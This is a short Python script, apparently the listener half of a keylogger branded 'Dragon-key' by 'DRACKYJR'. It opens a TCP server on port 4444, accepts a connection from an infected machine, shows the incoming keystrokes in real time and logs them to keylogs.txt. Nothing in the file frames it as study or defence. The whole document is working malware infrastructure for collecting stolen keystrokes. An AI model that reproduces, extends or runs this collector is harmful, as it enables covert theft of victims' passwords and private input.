import socket



print('\n')
print(' ____                                     _                ')
print(' |  _ \ _ __ __ _  __ _  ___  _ __       | | _____ _   _   ')
print(' | | | |  __/ _` |/ _` |/ _ \|  _ \ _____| |/ / _ \ | | |  ')
print(' | |_| | | | (_| | (_| | (_) | | | |_____|   <  __/ |_| |  ')
print(' |____/|_|  \__,_|\__, |\___/|_| |_|     |_|\_\___|\__, |  ')
print('                  |___/                            |___/   ')
print('------------------------DRACKYJR---------------------------')
print('\n')          

# Server setup
SERVER_IP = "0.0.0.0"  # Listen on all available interfaces
SERVER_PORT = 4444

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
server_socket.listen(5)
print(f"[*] Listening for connections on {SERVER_IP}:{SERVER_PORT}")

client_socket, client_addr = server_socket.accept()
print(f"[*] Connection received from {client_addr}")

# Log the keystrokes
with open("keylogs.txt", "a") as log_file:
    while True:
        try:
            key = client_socket.recv(1024).decode()
            print(key, end="", flush=True)  # Show in real-time
            log_file.write(key)
            log_file.flush()  # Immediately write to file
        except:
            break

client_socket.close()
server_socket.close()
